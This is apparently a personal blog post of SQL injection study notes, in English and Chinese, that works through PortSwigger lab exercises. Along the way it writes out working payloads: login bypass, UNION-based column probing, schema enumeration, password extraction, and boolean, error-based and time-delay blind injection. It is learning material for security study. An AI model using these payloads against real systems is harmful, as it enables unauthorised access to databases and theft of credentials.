---
layout:	post
title:  "SQL Injection Attacks"
date: 2022-2-7 23:00
author: "Adam"
header-img: "img/post-bg-SQL-injection-attack.jpg"
catalog: true
tags:
    - Security learning
    - SQL	
    - Server security
---



> Source: https://portswigger.net/web-security/sql-injection
>
> Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

## What is SQL Injection?

A **web vulnerability** that allows an attaker to interfere with the queries that an application makes to its database. Allow attakers to view data that they are not normally able to see. In some cases, SQL injection can be escalated to compromise underlying server or DoS attack.

#### Impact

- Leakage of unauthorised data.
- Persistant backdoor.

## Examples

### 1. Retrieving hidden data

- -- is a comment indicator in SQL, anything after will be interpreted as comment.
- Use `'` to break the SQL command and add the injection.
- Types of injections:
  - OR 1=1: return all data.

### 2. Subverting application logic

Scenario: user login with username and password. 

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

The goal is to hack in without knowing password, the method is to use the comment indicator to remove the password check, for example by entering username as `admin'--`. The logic will be subverted by remove the `WHERE` clause. 

### 3. Retrieving data from another database

Use ``UNION`` key word to make additional queries that are appended on the original query. For example:

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

Key requirements:

1. Each query must return the same number of columns.
2. The data types in each column must be compatible. (Same type for each column)

So that in order to carry out a UNION attack, I need to figure out: 

#### How many columns are required in the attack

1. Injecting a series of `'ORDER BY num--`clauses until an error occurs.  This means to order the results by different columns, if the number exceeds the column number, there might be error messages or detectable difference.
2. Submitting a series of `UNION SELECT NULL, NULL ...--`clauses. When matches, there will be an additional roll containing null values in each column. The reason using null is for compatibility. 
   1. For Oracle database, there is a built-in table called `dual` which can be used in this attack: ` UNION SELECT NULL FROM DUAL--`
   2. In MySQL, `--`must be followed by a space or simply use `#` as comment.

#### Finding columns with useful data type

To find which column has the desired data type, assume that there are 4 columns, you can submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

And you can judge the data type from the error message.

Now you know the number of columns and found which column has a string data, the next step is to get data you are interested in by `UNION` attack.

### 4. Examining the database

It is generally useful to get more information from the database for further exploitation. Including version details, contents of the database.

#### Get database type and version

Because that different databases have different ways of querying version, you usually need to try all the possible ways to determine which one it is. (Use `' UNION`)

| **Database type** | **Query**                      |
| ----------------- | ------------------------------ |
| Microsoft, MySQl  | `SELECT @@version`             |
| Oracle            | `Select banner FROM v$version` |
| PostgreSQL        | `SELECT version()`             |

---

**[Lab SQL injection, query the database type and version (Oracle)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)**

1. Find how many columns are there in the table. Add `'ORDER BY num'` to the end of the url and find that there are two columns.
2. Find that the second column has the datatype sting.
3. Add the following query to return the banner of the database.

`'UNION SELECT NULL, banner FROM v$version--`

Result:

 <img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyztugzf0pj30vg09cdgw.jpg" alt="image-20220202203119278" style="zoom:50%;" />

[Lab Query the database and version (MySQL and Microsoft)](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

1. First, determine the number of columns of the returned table using `'UNION SELECT NULL, NULL#`. Then we know that there are two columns.
2. Second, find the data type of these columns to see if they are string. By setting each `NULL` to `'a'`, two columns have the same data type of string, so we can use either to perform the SQL injection
3. Get the database version by the following query:`'UNION SELECT @@version, NULL#`

Result: 

<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzvkzwpt7j305003a3ya.jpg" alt="image-20220202213128309" style="zoom:50%;" />

#### Listing the content of the database

Most databases (except for Oracle) have views that provide information about the database. For example `information_schema` that contains the table names and column names for each table.

[Lab SQL injection, listing the databases on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

1. 首先还是通过NULL来决定表的每一列的数据类型。`'UNION SELECT NULL, NULL--`
2. 然后查看`information_schema`中的表名都是什么。`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

3. 找到一个user开头的表名，应该就是存放用户信息的，进一步看这个表中有哪些列。`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tsxwcv'--`

   

   ![image-20220208150439802](https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4f319oj30by02kwec.jpg)![image-20220208150459170](https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4pgcnqj30as03yt8m.jpg)

4. 这样就找到了存放用户名和密码的列。再次请求得到admin的密码即可。`'+UNION+SELECT+username_qvqafc,+password_zecjow+FROM+users_tsxwcv--`

![image-20220208150811298](https://tva1.sinaimg.cn/large/008i3skNgy1gz6i81e4t6j30fs04o3yi.jpg)

#### 在Oracle中的类似操作

在oracle中，只需要进行一些修改即可得到相同的数据。所有表的信息可以从`all_tables`获得，具体列名可以通过以下命令获得：

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`



> [Lab SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

由于Oracle数据库中的`SELECT`必须要和`FROM`配合出现，所以可以用`dual`表来进行占位。

1. 通过尝试，`'UNION+SELECT+'abc',+'abc'+FROM+dual--`成功，说明有当前表有两列且都是字符串类型。
2. 查看有哪些表：`'UNION+SELECT+table_name,+NULL+FROM+all_tables--`，找到了**USERS_AHJNLZ**这张表。
3. 查看这张表中有哪些列：`'UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_AHJNLZ'--`最终找到存放用户名和密码的列名为：PASSWORD_QAGOVT和USERNAME_WGWVWL
4. 最后就可以找到admin的密码：`'UNION SELECT USERNAME_WGWVWL, PASSWORD_QAGOVT FROM USERS_AHJNLZ--`

![image-20220208154259474](https://tva1.sinaimg.cn/large/008i3skNgy1gz6j89ft6oj30j20b0dg9.jpg)

### 4. 盲注（Blind SQL Injection)

在很多情形下，SQL注入后不会显示错误信息甚至不会返回任何信息，例如应用有SQL漏洞，但是其HTTP回应不含相应注入的返回信息和数据库错误信息。常用的如UNION注入就不再适用了。这种blind漏洞仍然是可利用的，只不过更加复杂。常用的盲注方法有：

#### 1）触发条件应答盲注

例如在使用cookie登录时，服务器可能使用以下语句验证cookie：

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'cookie'`

不同于之前的注入，不正确的cookie不会返回任何信息，但是正确的cookie会重定位到一个例如Welcome Back的页面，这样的行为就是一种条件应答，并且可以作为一个注入点。这样的注入如何进行呢？考虑下面两种cookie后的输入

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

第一个请求会显示welcome back，而第二个请求因为条件恒为false会导致没有返回，也就不会显示welcome back，这样的差别就让我们可以判断请求的对错从而获取数据库内的相关信息。例如，假设数据库中有一个User表，其中有Username和Password列，其中存放着用户Administrator的信息，我们可以通过每次确定一个字符的方式获取其登录密码，如下所示：

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

如果返回welcome页面，则可以确定其密码的第一个字符大于m。重复此步骤直到获得完整密码。

> [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

此lab的任务就是找到admin的密码，使用Burp查看一下页面请求发现了cookie：

`Cookie: TrackingId=xrZbR12nPsEWP8FJ; session=BBFx677kQDfMJXYbCXWJFahUhthnZdK3`

尝试再其后添加`AND '1'='1`，结果可以正常显示Welcome back，添加`AND '1'='2`后则不能正常显示，说明可以进行盲注。第二步就是逐步获得admin的密码。首先确定存在数据库，确定列名和admin的存在性。

`' AND (SELECT 'a' FROM users LIMIT 1)='a`

结果表明存在users表。

`' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

结果表明存在username这一列，并且存在用户administrator。接下来，最好确定一下密码的长度。

`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`

在repeater中不断修改长度，最终得到密码有20位，还是挺复杂的。接下来就可以尝试获取密码的具体值了。

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

这部分较为简单的方法就是使用intruder写payload进行自动攻击。

Password:`l0libd4yt463lcxyow0c`

可以明显感觉到从这一题开始不像开始那么简单了，工作量变得很大，所以我们应该更加注重工具的使用。

#### 2）通过触发SQL错误引入条件响应

当网站不会在数据库返回为空时显示不同的响应时，上面的注入就不能成功了。在这种情形下，通常可能的方式是通过引发SQL错误导致网页显示不同的响应。下面是两个cookie请求：

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

这些输入使用了关键字CASE根据不同的条件返回不同的表达式，第一个输入会返回`'a'`而第二个输入会返回`1/0`并造成devide-by-zero错误。此错误可能会造成页面的些许区别，如果有区别，我们就可以使用此区别来获取一些信息，如admin的密码：若密码第一位大于m则正常输出，若小于m则报错。

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

> ###### [Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

尝试用前两个请求作为输入，都会显示Internal Sever Error，原因可能是数据库种类的问题。提示说是Oracle数据库，所以应该使用Oracle对应的格式。

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 
```

这一次的payload就不再显示错误了，通过此输入判断密码长度为

```sql
' AND (SELECT CASE WHEN(username='administrator' AND LENGTH(password)>0) THEN to_char(1/0) ELSE 'a' END FROM dual)='a
```

#### 3) 通过触发时延(Time delays)进行盲注

如果应用会捕捉并处理数据库错误，上面的方法就不再适用。在这种情形下，由于SQL请求通常是同步运行的，延迟处理SQL请求意味着HTTP应答的延迟。所以，就可以通过HTTP相应的时延判断SQL运行的时延。触发时延的方法根据数据库种类的不同而不同，SQL Server中可以用以下代码触发：

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 	--不会触发
'; IF (1=1) WAITFOR DELAY '0:0:10'--	--会触发
/*
其他数据库：
Oracle 			dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 			SELECT sleep(10) 
*/
# 然后就可以用此方法获得信息。
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

> [Lab: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

Todo

> [Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

Todo

#### 4)使用带外技术（out-of-band)进行盲注

Todo



#### 5）如何防范盲注？

